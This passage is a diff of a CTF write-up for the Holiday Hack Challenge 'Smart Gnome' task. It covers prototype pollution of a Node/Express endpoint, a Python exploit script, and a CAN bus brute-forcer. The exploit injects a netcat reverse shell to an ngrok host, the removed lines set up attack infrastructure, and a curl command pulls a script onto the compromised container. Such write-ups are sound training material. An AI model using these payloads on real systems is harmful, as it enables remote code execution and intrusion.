+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;action&#34;</span>:<span style="color:#e6db74">&#34;update&#34;</span>,<span style="color:#e6db74">&#34;key&#34;</span>:<span style="color:#e6db74">&#34;__proto__&#34;</span>,<span style="color:#e6db74">&#34;subkey&#34;</span>:<span style="color:#e6db74">&#34;toString&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">}</span></span></span></code></pre></div>
+<p>After URL-encoding the payload and refreshing the page, the application began throwing global errors related to <code>Object.prototype</code>, confirming that <code>__proto__</code> pollution is possible.</p>
+<hr>
+<h3 id="weaponizing-the-vulnerability">Weaponizing the vulnerability</h3>
+<p>At this point I switched to Python to automate the attack flow, as interacting via the browser became cumbersome.</p>
+<p>The following script performs the complete exploitation chain:</p>
 <ol>
-<li>Login to the control panel</li>
-<li>Trigger JSON parse error</li>
-<li>Stages the payload. In this (final) version it pollutes __proto__ with a piece of code that connects back to our reverse shell</li>
-<li>Triggers the reverse shell by visiting the /stats endpoint</li>
+<li>Logs in to the control panel</li>
+<li>Triggers a JSON parsing error</li>
+<li>Pollutes <code>__proto__</code> with required flags (<code>debug</code>, <code>client</code>)</li>
+<li>Injects a malicious <code>escapeFunction</code></li>
+<li>Triggers execution by loading <code>/stats</code></li>
 </ol>
-<p>We found this to be a functional and fairly quick methodology to tackle the objective. The code:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> html
@@ -491,32 +481,19 @@ escapeFn is not a function
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger JSON parse error</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>error_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=&#39;&#34;</span>
 </span></span><span style="display:flex;"><span>payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(error_url)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>payload_r<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>soup <span style="color:#f92672">=</span> BeautifulSoup(payload_r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
 </span></span><span style="display:flex;"><span>raw_text <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>pre<span style="color:#f92672">.</span>get_text() 
 </span></span><span style="display:flex;"><span>decoded_text <span style="color:#f92672">=</span> html<span style="color:#f92672">.</span>unescape(raw_text)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 1. Provoke Error message&#34;</span>)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
 </span></span><span style="display:flex;"><span>print(decoded_text)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Staging</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 2. Staging&#34;</span>)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================&#34;</span>)
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> subkey <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;debug&#34;</span>, <span style="color:#e6db74">&#34;client&#34;</span>]:
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">== Staging </span><span style="color:#e6db74">{</span>subkey<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
 </span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;update&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;key&#34;</span>: <span style="color:#e6db74">&#34;__proto__&#34;</span>,
@@ -526,14 +503,11 @@ escapeFn is not a function
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    payload_encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(json<span style="color:#f92672">.</span>dumps(payload))
 </span></span><span style="display:flex;"><span>    proto_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=</span><span style="color:#e6db74">{</span>payload_encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>    payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(proto_url)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>payload_r<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(payload_r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>get(proto_url)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 3. Weaponizing&#34;</span>)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Weaponizing</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;update&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;key&#34;</span>: <span style="color:#e6db74">&#34;__proto__&#34;</span>,
@@ -541,125 +515,32 @@ escapeFn is not a function
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;JSON.stringify; process.mainModule.require(&#39;child_process&#39;).exec(&#39;nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000&#39;)&#34;</span>
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>payload_encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(json<span style="color:#f92672">.</span>dumps(payload))
 </span></span><span style="display:flex;"><span>proto_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=</span><span style="color:#e6db74">{</span>payload_encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>payload_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(proto_url)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>payload_r<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>print(payload_r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>get(proto_url)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Smart Gnome Control Center - Smart Gnome Statistics panel</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===========================================&#34;</span>)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Step 4. Stats page&#34;</span>)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;===========================================</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger execution</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
 </span></span><span style="display:flex;"><span>stats_panel_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats&#34;</span>
-</span></span><span style="display:flex;"><span>stats_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(stats_panel_url)
-</span></span><span style="display:flex;"><span>print(stats_r<span style="color:#f92672">.</span>text)</span></span></code></pre></div>
-<p>We made the script output the URLs so we could copy them and paste them into our web browser to bring the reverse shell into our logged in session to steer the robot.</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>===========================================
-Step 1. Provoke Error message
-===========================================
-
-SyntaxError: Unexpected token &#39; in JSON at position 0    at JSON.parse (&lt;anonymous&gt;)    at /app/server.js:121:33    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at next (/app/node_modules/express/lib/router/route.js:149:13)    at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at /app/node_modules/express/lib/router/index.js:284:15    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)    at next (/app/node_modules/express/lib/router/index.js:280:10)    at /app/server.js:49:9
-
-===========================================
-Step 2. Staging
-===========================================
-
-== Staging debug
-
-URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22debug%22%2C+%22value%22%3A+1%7D
-{&#34;type&#34;:&#34;message&#34;,&#34;data&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Updated __proto__.debug to 1&#34;}
-
-== Staging client
-
-URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22client%22%2C+%22value%22%3A+1%7D
-{&#34;type&#34;:&#34;message&#34;,&#34;data&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Updated __proto__.client to 1&#34;}
-
-===========================================
-Step 3. Weaponizing
-===========================================
-
-URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22escapeFunction%22%2C+%22value%22%3A+%22JSON.stringify%3B+process.mainModule.require%28%27child_process%27%29.exec%28%27nc+-e+%2Fbin%2Fbash+4.tcp.eu.ngrok.io+19342%3Bsleep+10000000%27%29%22%7D
-{&#34;type&#34;:&#34;message&#34;,&#34;data&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Updated __proto__.escapeFunction to JSON.stringify; process.mainModule.require(&#39;child_process&#39;).exec(&#39;nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000&#39;)&#34;}
-
-===========================================
-Step 4. Stats page
-===========================================
-
-... snip ...</code></pre></div>
-<p>In the initial development phase of our payload we made it reach out to a webhook on the Internett, just to verify it working. Once that was done we simply changed over to using an Ngrok infrastucture with netcat shell.</p>
-<h4 id="setup-attack-infrastructure">Setup attack infrastructure</h4>
-<p>In order to conduct this attack we had to set up the following infrastructure using Kali in WSL (in total four instances):</p>
-<table>
-  <thead>
-      <tr>
-          <th>Command</th>
-          <th>Public</th>
-          <th>Description</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><code>ngrok tcp 8501</code></td>
-          <td>Yes</td>
-          <td>Public exposed reverse shell port through Ngrok</td>
-      </tr>
-      <tr>
-          <td><code>nc -lnvp 8501</code></td>
-          <td>No</td>
-          <td>Local (attacking machine) listening port using Netcat mapped to public Ngrok bridge</td>
-      </tr>
-      <tr>
-          <td><code>ngrok http 8001</code></td>
-          <td>Yes</td>
-          <td>Public exposed web server for serving scripts</td>
-      </tr>
-      <tr>
-          <td><code>python3 -m http.server 8001</code></td>
-          <td>No</td>
-          <td>Local (attacking machine) web server mapped to public Ngrok bridge</td>
-      </tr>
-  </tbody>
-</table>
-<p>The communication will then look like this:</p>
-<pre class="mermaid align-center ">---
-config:
-      theme: redux
----
-flowchart LR
-    subgraph Attacker[&#34;Attacking machine&#34;]
-        webserver
-        netcat
-    end
-
-    subgraph NGROK[&#34;NGROK&#34;]
-        HTTP
-        TCP
-    end
-
-    SGCC[&#34;Smart Gnome Control Center&#34;] &lt;--TCP/443--&gt; HTTP
-    SGCC[&#34;Smart Gnome Control Center&#34;] &lt;--TCP/19342--&gt; TCP
-    HTTP &lt;--TCP/8001--&gt; webserver[&#34;Python webserver&#34;]
-    TCP &lt;--TCP/8501--&gt; netcat[&#34;Netcat listener&#34;]</pre>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>get(stats_panel_url)</span></span></code></pre></div>
+<p>Note: The script outputs the various URLs for this to work. I simply had to copy and execute them in a browser in order to play the game. From here on the report reflects that.</p>
+<hr>
 <h3 id="operating-the-reverse-shell">Operating the reverse shell</h3>
-<p>With our payload in order it quickly called back through our infrastructe and we got shell. We immediatly started to snoop around:</p>
-<p><a href="#R-image-2e0946ca08017e8d70b532754ef3f477" class="lightbox-link"><img alt="Call back" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-2e0946ca08017e8d70b532754ef3f477"><img alt="Call back" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png"></a></p>
-<p>The <code>canbus_client.py</code> caught our eye:</p>
-<p><a href="#R-image-adb189fad9a41ac46a4942343f5c9734" class="lightbox-link"><img alt="Canbus client" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-adb189fad9a41ac46a4942343f5c9734"><img alt="Canbus client" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png"></a></p>
-<p>Turns out this was a script to interact with the CAN bus and contained a COMMAND_MAP with codes we recognized from the error messages for the bot in the Gnome Control Center. All of these codes leads to errors and no wonder because the comment in code mentions they are wrong. We then turned our attention to the <em>README.md</em> file:</p>
-<p><a href="#R-image-0c8545a3b6022e71325d12c54904d6fb" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-0c8545a3b6022e71325d12c54904d6fb"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png"></a></p>
-<p>A whole lot of text, but only the very last part is of interest. It basically state the codes to move the robot is unknown at the moment. So we were left alone to figure these out.</p>
-<h3 id="enumerating-control-codes">Enumerating control codes</h3>
-<p>In order to find the correct control codes we took basis in the Python script on the server, uploaded it to ChatGPT and asked ChatGPT to make it into a bruteforcing script. This script was then uploaded back onto the server using the command:</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>curl -o cb.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py</code></pre></div>
-<p>We had to run this script in several iterations due to the amount of HEX codes involved. For each iteration we kept an eye on the robot in <code>Gnome Control Interface</code> for any movement. For each iteration we shortened the range and at the end we ended up with bruteforcing the <em>0x200-0x206</em> range. Thus the script below is the final revision for that range:</p>
+<p>Once the payload was in place, it connected back through my infrastructure, resulting in an interactive shell:</p>
+<p><a href="#R-image-4cf59d070d41be0ae21fe887035ac250" class="lightbox-link"><img alt="Call back" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-4cf59d070d41be0ae21fe887035ac250"><img alt="Call back" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png"></a></p>
+<p>While exploring the container, the <code>canbus_client.py</code> script stood out:</p>
+<p><a href="#R-image-c09dfe95b7b466e85f4eb51a97cb28e3" class="lightbox-link"><img alt="Canbus client" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c09dfe95b7b466e85f4eb51a97cb28e3"><img alt="Canbus client" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png"></a></p>
+<p>The script contains a <code>COMMAND_MAP</code>, but comments indicate the values are incorrect. The accompanying README confirms this:</p>
+<p><a href="#R-image-e40435ccf15b2b3b861bc29662c61d95" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-e40435ccf15b2b3b861bc29662c61d95"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png"></a></p>
+<hr>
+<h3 id="enumerating-can-bus-control-codes">Enumerating CAN bus control codes</h3>
+<p>To identify the correct movement commands, I modified the existing Python script into a brute-force CAN bus scanner and uploaded it to the container:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -o cb.py https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py</span></span></code></pre></div>
+<p>The script was executed iteratively, narrowing the ID range based on observed robot movement. The final scan range was limited to <code>0x200–0x206</code>.</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
@@ -670,102 +551,18 @@ flowchart LR
 </span></span><span style="display:flex;"><span>RPM_LEFT_ID  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x310</span>
 </span></span><span style="display:flex;"><span>RPM_RIGHT_ID <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x311</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># LIMIT THE SEARCH RANGE HERE (end is exclusive)</span>
 </span></span><span style="display:flex;"><span>SCAN_START <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x200</span>
-</span></span><span style="display:flex;"><span>SCAN_END   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x206</span>   <span style="color:#75715e"># includes 0x205</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">int16_be</span>(b: bytes) <span style="color:#f92672">-&gt;</span> int:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;h&#34;</span>, b[:<span style="color:#ae81ff">2</span>])[<span style="color:#ae81ff">0</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_rpm_snapshot</span>(bus, window_s<span style="color:#f92672">=</span><span style="color:#ae81ff">0.20</span>):
-</span></span><span style="display:flex;"><span>    end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">+</span> window_s
-</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> right <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">&lt;</span> end:
-</span></span><span style="display:flex;"><span>        msg <span style="color:#f92672">=</span> bus<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.02</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> msg:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> msg<span style="color:#f92672">.</span>arbitration_id <span style="color:#f92672">==</span> RPM_LEFT_ID <span style="color:#f92672">and</span> len(msg<span style="color:#f92672">.</span>data) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>:
-</span></span><span style="display:flex;"><span>            left <span style="color:#f92672">=</span> int16_be(msg<span style="color:#f92672">.</span>data)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> msg<span style="color:#f92672">.</span>arbitration_id <span style="color:#f92672">==</span> RPM_RIGHT_ID <span style="color:#f92672">and</span> len(msg<span style="color:#f92672">.</span>data) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>:
-</span></span><span style="display:flex;"><span>            right <span style="color:#f92672">=</span> int16_be(msg<span style="color:#f92672">.</span>data)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> left, right
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rpm_changed</span>(before, after, threshold<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">in</span> before <span style="color:#f92672">or</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">in</span> after:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> abs(after[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> before[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">&gt;=</span> threshold <span style="color:#f92672">or</span> abs(after[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> before[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&gt;=</span> threshold
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_frame</span>(bus, arb_id, data: bytes, extended<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
-</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> can<span style="color:#f92672">.</span>Message(arbitration_id<span style="color:#f92672">=</span>arb_id, data<span style="color:#f92672">=</span>data, is_extended_id<span style="color:#f92672">=</span>extended)
-</span></span><span style="display:flex;"><span>    bus<span style="color:#f92672">.</span>send(msg)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scan</span>(bus, start, end, payloads, extended<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, rate_sleep<span style="color:#f92672">=</span><span style="color:#ae81ff">0.03</span>, verbose_every<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
-</span></span><span style="display:flex;"><span>    hits <span style="color:#f92672">=</span> []
-</span></span><span style="display:flex;"><span>    _ <span style="color:#f92672">=</span> read_rpm_snapshot(bus, <span style="color:#ae81ff">0.30</span>)  <span style="color:#75715e"># prime</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    attempt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> arb_id <span style="color:#f92672">in</span> range(start, end):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> data <span style="color:#f92672">in</span> payloads:
-</span></span><span style="display:flex;"><span>            attempt <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> verbose_every <span style="color:#f92672">and</span> attempt <span style="color:#f92672">%</span> verbose_every <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
-</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># OUTPUT EXACTLY WHAT WE&#39;RE TRYING</span>
-</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;TRY id=0x</span><span style="color:#e6db74">{</span>arb_id<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> dlc=</span><span style="color:#e6db74">{</span>len(data)<span style="color:#e6db74">}</span><span style="color:#e6db74"> data=</span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(empty)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            before <span style="color:#f92672">=</span> read_rpm_snapshot(bus, <span style="color:#ae81ff">0.12</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>                send_frame(bus, arb_id, data, extended<span style="color:#f92672">=</span>extended)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> can<span style="color:#f92672">.</span>CanError:
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
-</span></span><span style="display:flex;"><span>            after <span style="color:#f92672">=</span> read_rpm_snapshot(bus, <span style="color:#ae81ff">0.22</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> rpm_changed(before, after):
-</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;HIT id=0x</span><span style="color:#e6db74">{</span>arb_id<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> data=</span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(empty)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> RPM </span><span style="color:#e6db74">{</span>before<span style="color:#e6db74">}</span><span style="color:#e6db74">-&gt;</span><span style="color:#e6db74">{</span>after<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>                hits<span style="color:#f92672">.</span>append((arb_id, data, before, after))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(rate_sleep)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hits
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>    bus <span style="color:#f92672">=</span> can<span style="color:#f92672">.</span>interface<span style="color:#f92672">.</span>Bus(channel<span style="color:#f92672">=</span>IFACE, interface<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;socketcan&#34;</span>, receive_own_messages<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    payloads <span style="color:#f92672">=</span> [
